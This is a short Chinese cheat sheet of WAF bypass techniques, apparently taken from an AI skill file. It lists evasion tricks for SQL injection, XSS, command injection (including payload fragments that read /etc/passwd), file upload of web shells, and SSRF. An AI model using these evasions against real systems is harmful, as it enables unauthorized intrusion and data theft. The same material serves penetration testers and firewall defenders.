# 四、分类绕过速查

> 来源：CkSKILLS v1 `waf-bypass-techniques` §四、分类绕过速查（迁移至 v2 知识块）

### SQL 注入绕过
```
大小写：SeLeCt / 双写：selselectect
注释：/**/、/*!*/、--+、#
编码：URL编码、十六进制、Unicode
等价函数：substr→mid、ascii→ord
```

### XSS 绕过
```
HTML实体：&#60;script&#62;
事件：onerror/onload/onfocus/onmouseover
标签：<svg>、<img>、<iframe>、<math>
伪协议：javascript:、data:
```

### 命令注入绕过
```
分隔符：| / || / & / && / ; / %0a
空格：${IFS} / $IFS$9 / %09 / {cat,/etc/passwd}
通配符：/???/??t /etc/passwd
```

### 文件上传绕过
```
扩展名：.php5/.phtml/.phar/.htaccess/.user.ini
双扩展：shell.php.jpg / shell.jpg.php
%00截断：shell.php%00.jpg
内容：GIF89a头、图片马
```

### SSRF 绕过
```
IP混淆：十进制/十六进制/八进制
重定向：302跳转、DNS重绑定
协议差异：@符号、URL解析差异
```
